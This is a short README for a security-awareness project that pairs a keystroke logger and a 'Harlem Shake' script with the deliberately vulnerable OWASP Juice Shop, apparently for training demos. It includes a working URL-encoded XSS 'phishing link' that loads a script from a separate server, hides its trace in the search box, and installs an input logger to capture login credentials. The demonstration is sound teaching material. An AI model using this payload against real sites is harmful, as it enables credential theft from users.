# shake-logger
This projects provides a logger and a connected harlem shake js. The shake logger runs on port 8080, make sure that it is not blocked.

Please enable [autoplay](https://www.ghacks.net/2018/02/06/how-to-control-audio-and-video-autoplay-in-google-chrome/) in your browser.

# Juice Shop
This projects helps in awareness trainings, specally with the [juice shop](https://github.com/bkimminich/juice-shop).
You can use it via docker and docker-compose running:
´docker-compose up´

To show the possible impact of [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), assume you received and (of course) clicked
[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dapple%22%3BsearchQuery.value%20%3D%20%22apple%22%3B%60%29%27%3C%2Fimg%3Eapple)
and login. Apart from the visual/audible effect, the attacker also
installed [an input logger](http://localhost:8080/logger.php) to grab credentials! This could easily run on a 3rd party server in real life!

> You can also find a recording of this attack in action on YouTube:
> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
